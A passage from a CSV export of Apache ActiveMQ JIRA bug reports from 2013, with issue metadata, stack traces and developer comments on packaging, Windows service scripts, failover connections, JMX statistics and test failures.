7928 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.jmx.ManagementContext  - Unregistering MBean org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=TEST,endpoint=Producer,clientId=TEST,producerId=ID_Berlin-60845-1373442523293-2_1_0_0
7929 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.TransportConnection  - remove connection id: ID:Berlin-60845-1373442523293-2:1
7929 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.transport.tcp.TcpTransport  - Stopping transport tcp:///127.0.0.1:60846@5672",Windows 7,axel.podehl,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337246,,,Mon Jul 15 12:55:28 UTC 2013,,,,,,,,,,,"0|i1m65j:",337569,,,,,,,,,,,,,,,,,,,,,"10/Jul/13 14:55;tabish;Searching through the Broker code doesn't reveal any println's that are active so maybe check on your client side. ;;;","10/Jul/13 15:00;axel.podehl;Well, it's the Broker code which is printing this ID.
;;;","10/Jul/13 15:06;tabish;If you can find it, we welcome a patch. ;;;","10/Jul/13 15:18;axel.podehl;;-) yeah, I was afraid you'd say that. Let me see if I find the bandwidth to get started on that.;;;","12/Jul/13 10:14;axel.podehl;Hi Timothy, I tried to get the latest ActiveMQ code through Eclipse/subclipse, but it doesn't let me download it.
The documentation about subversion download says 'site password' - what is that, exactly ?

In my case is it my ActiveMQ User Forum's User name (Axel Podehl) and the user forum's password ? ;;;","12/Jul/13 15:08;tabish;Not really sure what you are doing, there's no need for a password just to checkout the code from svn, only for commit. ;;;","12/Jul/13 15:15;axel.podehl;subclipse with https://svn.apache.org/repos/asf/activemq/trunk automatically asks me for username and password and none of the combination I could imagine worked.

But from the DOS command line, 'svn co' works, so I'll go that route...

;;;","15/Jul/13 12:55;axel.podehl;don't see this anymore with the latest 5.9 snapshot from 20130711
Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
XPP Pull parser lib missing from AMQ distro ,AMQ-4625,12656883,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,09/Jul/13 15:41,09/Jul/13 15:42,14/Jul/23 05:43,09/Jul/13 15:42,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,the XPP XML Pull parser used in XStream is missing from lib/optional in the 5.8 distro tar and zip files.  ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337106,,,Tue Jul 09 15:42:51 UTC 2013,,,,,,,,,,,"0|i1m5an:",337429,,,,,,,,,,,,,,,,,,,,,"09/Jul/13 15:42;tabish;fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"InstallService.bat, UninstallService.bat running failed on explorer(win32,64)",AMQ-4623,12656845,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,rafael jeon,rafael jeon,09/Jul/13 12:00,12/Jul/13 00:35,14/Jul/23 05:43,11/Jul/13 15:21,5.8.0,,,,,5.9.0,,,,,,,0,patch,,,,,,,,"InstallService.bat, UninstallService.bat running failed on explorer(win32,64)
","os : windows 7 64bit
java : jdk1.7.0_21(oracle)",rafael jeon,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1800,1800,,0%,1800,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jul/13 02:15;rafael jeon;installservice_patchfile.txt;https://issues.apache.org/jira/secure/attachment/12591582/installservice_patchfile.txt","10/Jul/13 02:07;rafael jeon;screenshot-1.jpg;https://issues.apache.org/jira/secure/attachment/12591579/screenshot-1.jpg","10/Jul/13 02:16;rafael jeon;uninstallservice_patchfile.txt;https://issues.apache.org/jira/secure/attachment/12591583/uninstallservice_patchfile.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337068,,,Thu Jul 11 15:21:06 UTC 2013,,,,,,,Patch Available,,,,"0|i1m527:",337391,,,,,,,,,,,,,,,,,,,,,"09/Jul/13 13:55;tabish;Not much for us to go on here.  Did you see any errors etc?  Have you tried a recent 5.9 SNAPSHOT build to see if this is resolved already? ;;;","10/Jul/13 02:13;rafael jeon;I attached screenshot(screenshot-1.jpg) when executing InstallService.bat(apache-activemq-5.8.0\bin\win64)
on explorer win7 64 bit.
It also same problem with UninstallService.bat;;;","11/Jul/13 06:03;rafael jeon;The 5.9 SNAPSHOT(https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.9-SNAPSHOT/apache-activemq-5.9-20130708.151752-73-bin.zip) has same issue.;;;","11/Jul/13 15:21;tabish;Updated 32 and 64 bit scripts with this change, test on Windows 7 x64 and service is now installable from console or via run as admin in explorer. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover configuration establishes more and more connections to inactive ActiveMQ instance,AMQ-4618,12656338,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,rmescandon,rmescandon,05/Jul/13 08:24,10/Jul/13 10:51,14/Jul/23 05:43,10/Jul/13 10:51,5.6.0,,,,,,,,,,,,0,,,,,,,,,"We have a big problem in a production environment usign ActiveMQ 5.6.0:
We have two ActiveMQ instances started up and a consumer application reading from them. The configuration is set to failover so that consumer application reads JMS messages from first instance and changes to second instance only if first one is not reachable.
After some days, we have seen that there is only one connection established to first ActiveMQ instance, but there are more than 80 established connections to second instance (the backup one). Every day more and more connections are created to backup instance until ""java.net.SocketException: Too many open files"" exception is thrown in consumer application because the number of file descriptors is huge


Between ActiveMQ instances and consumer application there is a F5 with a timeout of 300 seconds. Could it be responsible of this bad behaviour?. I think that when F5 detects inactivity in a connection for 300 seconds, it will close it, but ActiveMQ will open a new one, so there should be only one connection at the same time, not growing the number of them, isn't it?


The failover configuration in client is set to:

jms.broker.url=failover:(tcp://activeMQHost1:61616,tcp://activeMQHost2:61616)?randomize=false&timeout=3000&priorityBackup=true

Is there any additional parameter to set to solve this problem?


Thanks in advance",,rmescandon,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,336561,,,Wed Jul 10 10:51:50 UTC 2013,,,,,,,,,,,"0|i1m1xr:",336885,,,,,,,,,,,,,,,,,,,,,"05/Jul/13 13:09;tabish;I'd recommend you test against the latest release, or the latest 5.9.SNAPSHOT build to see if you can reproduce this.  ;;;","10/Jul/13 10:51;rmescandon;Hi

We've found the problem. It seems a client problem. The client was using a JmsTemplate Spring object to send JMS messages to ActiveMq instance, and it seems that it was creating a new connection every time a message was sent. As the configuration was set in failover mode, a new connection was also created to ""inactive"" ActiveMQ instance, but that one was not closed because it was not ever used. (It was only closed when client was shut down)

I close the issue. Thank you very much and sorry for any inconvenience.

Regards.;;;","10/Jul/13 10:51;rmescandon;This was not any ActiveMQ problem but client one;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ shows icon in Dock on MacOSX (with solution),AMQ-4610,12655567,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,erikvanoosten,erikvanoosten,01/Jul/13 10:01,02/Jul/13 22:57,14/Jul/23 05:43,02/Jul/13 22:57,5.8.0,,,,,5.9.0,,,,,,,1,,,,,,,,,"On Mac activemq shows an really annoying icon in the doc.

Please add the following options to the startup script to get rid of it:

{noformat}
-Djava.awt.headless=true
{noformat}",,erikvanoosten,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335842,,,Tue Jul 02 22:57:14 UTC 2013,,,,,,,,,,,"0|i1lxi7:",336166,,,,,,,,,,,,,,,,,,,,,"02/Jul/13 22:57;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"NetworkConnector MBean registered early, causing wrong MBean server to be started",AMQ-4609,12655307,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,28/Jun/13 10:57,28/Jun/13 11:05,14/Jul/23 05:43,28/Jun/13 11:05,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"If network connectors are added before JMX management context is created a default one will be created. So if we configure a context with different port, two will be created in total. We should register network connectors after broker is initialised and context is properly created.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335584,,,Fri Jun 28 11:05:10 UTC 2013,,,,,,,,,,,"0|i1lvwv:",335908,,,,,,,,,,,,,,,,,,,,,"28/Jun/13 11:05;dejanb;Fixed with svn revision 1497733;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerXmlConfigStartTest  fails on activemq-leveldb-replicating.xml,AMQ-4606,12655087,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,kearls,kearls,27/Jun/13 07:42,02/Oct/13 15:11,14/Jul/23 05:43,02/Oct/13 15:11,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This fails with the following:

java.lang.IllegalStateException: BeanFactory not initialized or already closed - call 'refresh' before accessing beans via the ApplicationContext
	at org.springframework.context.support.AbstractRefreshableApplicationContext.getBeanFactory(AbstractRefreshableApplicationContext.java:172)
	at org.springframework.context.support.AbstractApplicationContext.destroyBeans(AbstractApplicationContext.java:1078)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:480)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:101)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:101)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:65)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:85)
	at org.apache.activemq.config.BrokerXmlConfigStartTest.testStartBrokerUsingXmlConfig1(BrokerXmlConfigStartTest.java:84)

",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335364,,,Tue Aug 27 07:21:53 UTC 2013,,,,,,,,,,,"0|i1luk7:",335688,,,,,,,,,,,,,,,,,,,,,"26/Aug/13 15:01;tabish;Are you still seeing this one?  Haven't seen it fail here. ;;;","27/Aug/13 07:21;kearls;Strange.  It always fails for me with the following:  (this is on mac os with jdk7)


Running org.apache.activemq.config.BrokerXmlConfigStartTest
Tests run: 14, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 333.544 sec <<< FAILURE!
testStartBrokerUsingXmlConfig1[4](org.apache.activemq.config.BrokerXmlConfigStartTest)  Time elapsed: 1.234 sec  <<< ERROR!
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/Users/kearls/sources/tmp/activemq/assembly/target/conf/activemq-jdbc-performance.xml]: Invocation of init method failed; nested exception is java.io.IOException: Cannot load JDBC driver class 'com.mysql.jdbc.Driver'
	at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
	at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
	at org.apache.commons.dbcp.BasicDataSource.createConnectionFactory(BasicDataSource.java:1420)
	at org.apache.commons.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1371)
	at org.apache.commons.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044)
	at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.loadAdapter(JDBCPersistenceAdapter.java:451)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.createAdapter(JDBCPersistenceAdapter.java:434)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getAdapter(JDBCPersistenceAdapter.java:383)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.init(JDBCPersistenceAdapter.java:295)
	at org.apache.activemq.broker.LockableServiceSupport.preStart(LockableServiceSupport.java:84)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:54)
	at org.apache.activemq.broker.BrokerService.doStartPersistenceAdapter(BrokerService.java:613)
	at org.apache.activemq.broker.BrokerService.startPersistenceAdapter(BrokerService.java:602)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:567)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:73)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1608)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1549)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1479)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:521)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:295)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:223)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:292)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:194)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:626)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:932)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:103)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:103)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:65)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:85)
	at org.apache.activemq.config.BrokerXmlConfigStartTest.testStartBrokerUsingXmlConfig1(BrokerXmlConfigStartTest.java:87)

testStartBrokerUsingXmlConfig1[6](org.apache.activemq.config.BrokerXmlConfigStartTest)  Time elapsed: 33.19 sec  <<< ERROR!
java.lang.IllegalStateException: BeanFactory not initialized or already closed - call 'refresh' before accessing beans via the ApplicationContext
	at org.springframework.context.support.AbstractRefreshableApplicationContext.getBeanFactory(AbstractRefreshableApplicationContext.java:171)
	at org.springframework.context.support.AbstractApplicationContext.destroyBeans(AbstractApplicationContext.java:1090)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:487)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:103)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:103)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:65)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:85)
	at org.apache.activemq.config.BrokerXmlConfigStartTest.testStartBrokerUsingXmlConfig1(BrokerXmlConfigStartTest.java:87)

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ2149KahaDBTest is redundant,AMQ-4605,12655085,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,kearls,kearls,27/Jun/13 07:30,28/Jun/13 12:42,14/Jul/23 05:43,28/Jun/13 12:42,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"AMQ2149KahaDBTest extends AMQ2149Test, but doesn't change anything.  It used to override configurePersistenceAdapter(), but that has been commented out as KahaDB is the default persistence adapter.

We should just remove this test.
",,gtully,kearls,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335362,,,Fri Jun 28 12:42:01 UTC 2013,,,,,,,,,,,"0|i1lujr:",335686,,,,,,,,,,,,,,,,,,,,,"28/Jun/13 12:42;gtully;removed in r1497752;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update QPID Client version to 0.22,AMQ-4604,12654918,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,26/Jun/13 12:05,01/Jul/13 15:20,14/Jul/23 05:43,01/Jul/13 15:20,,,,,,5.9.0,,,,,,,0,,,,,,,,,0.22 is the latest released version. ,,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jun/13 12:06;kearls;AMQ-4604.patch;https://issues.apache.org/jira/secure/attachment/12589738/AMQ-4604.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335195,,,Mon Jul 01 15:20:18 UTC 2013,,,,,,,Patch Available,,,,"0|i1ltin:",335519,,,,,,,,,,,,,,,,,,,,,"26/Jun/13 12:06;kearls;Updated pom.
;;;","01/Jul/13 15:20;tabish;fixed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-ra missing dependency commons-pool,AMQ-4602,12654887,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,mashlah,mashlah,26/Jun/13 07:56,30/Aug/13 14:31,14/Jul/23 05:43,30/Aug/13 14:31,5.8.0,,,,,5.9.0,,,JCA Container,,,,0,,,,,,,,,"When using a org.apache.activemq.pool.PooledConnectionFactory in our web application and trying to deploy it on glassfish that has activemq-ra 5.8.0 deployed, an exception with message ""ClassNotFoundException: org.apache.commons.pool.KeyedPoolableObjectFactory"" was thrown.",glassfish 3.2.1,gtully,lhcpig,mashlah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4172,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335164,,,Fri Aug 30 14:31:59 UTC 2013,,,,,,,,,,,"0|i1ltbr:",335488,Regression,,,,,,,,,,,,,,,,,,,,"30/Aug/13 07:05;lhcpig;我遇到了和你一样的问题·;;;","30/Aug/13 14:31;gtully;fixed with https://issues.apache.org/jira/browse/AMQ-4172;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Only package the pure java LevelDB driver by default,AMQ-4599,12654748,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,25/Jun/13 15:08,25/Jun/13 15:29,14/Jul/23 05:43,25/Jun/13 15:29,,,,,,5.9.0,,,LevelDB,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,335025,,,Tue Jun 25 15:11:12 UTC 2013,,,,,,,,,,,"0|i1lsh3:",335349,,,,,,,,,,,,,,,,,,,,,"25/Jun/13 15:11;chirino;The pure java leveldb driver will be easier to maintain in the long run since you can seamlessly debug into it.
Lets only ship the pure java drive in the next major release so that way the rest of the community can help us 'harden' it up.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Negative JMX QueueSize attribute in due to purging a queue,AMQ-4598,12654707,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,25/Jun/13 11:43,03/Nov/16 22:09,14/Jul/23 05:43,25/Jun/13 11:49,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"If you purge a queue that has a bunch of messages prefetched you may end up with a negative QueueSize in JMX as the prefetched messages get acked after the purge. 
This behavior should be considered a bug as many users depend on these JMX statistics.",,dejanb,githubbot,lichtin,metatech,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3472,AMQ-3111,,,,,,,,,,,,"17/Feb/15 10:54;metatech;amq_negative_queue_size_after_purge.diff;https://issues.apache.org/jira/secure/attachment/12699237/amq_negative_queue_size_after_purge.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,334984,,,Thu Nov 03 22:09:02 UTC 2016,,,,,,,,,,,"0|i1ls7z:",335308,,,,,,,,,,,,,,,,,,,,,"25/Jun/13 11:49;dejanb;Fixed with svn revision 1496430;;;","17/Feb/15 10:54;metatech;This fix works, but the queue size hides all the inflight messages because the counter goes immediately to 0, although inflight messages are still being processed.
The behaviour is different when a queue is not purged (all inflight messages are counted in) and when a queue is purged (inflight messages are not counted in).  
This would be more consistent to always reset the counter to the number of inflight messages in the queue (see attachment amq_negative_queue_size_after_purge.diff)
;;;","17/Feb/15 11:03;githubbot;GitHub user metatechbe opened a pull request:

    https://github.com/apache/activemq/pull/62

    AMQ-4598 purge enhancement

    Reset queue counter during ""purge"" to the number of inflight messages, so that they are not ""hidden"" while still being processed.

You can merge this pull request into a Git repository by running:

    $ git pull https://github.com/metatechbe/activemq patch-1

Alternatively you can review and apply these changes as the patch at:

    https://github.com/apache/activemq/pull/62.patch

To close this pull request, make a commit to your master/trunk branch
with (at least) the following in the commit message:

    This closes #62
    
----
commit 752573dbee35a86cb83ceaed1c122e878f298d27
Author: metatechbe <metatechbe@gmail.com>
Date:   2015-02-17T11:03:42Z

    AMQ-4598 purge enhancement
    
    Reset queue counter during ""purge"" to the number of inflight messages, so that they are not ""hidden"" while still being processed.

----
;;;","03/Nov/16 22:09;githubbot;Github user asfgit closed the pull request at:

    https://github.com/apache/activemq/pull/62
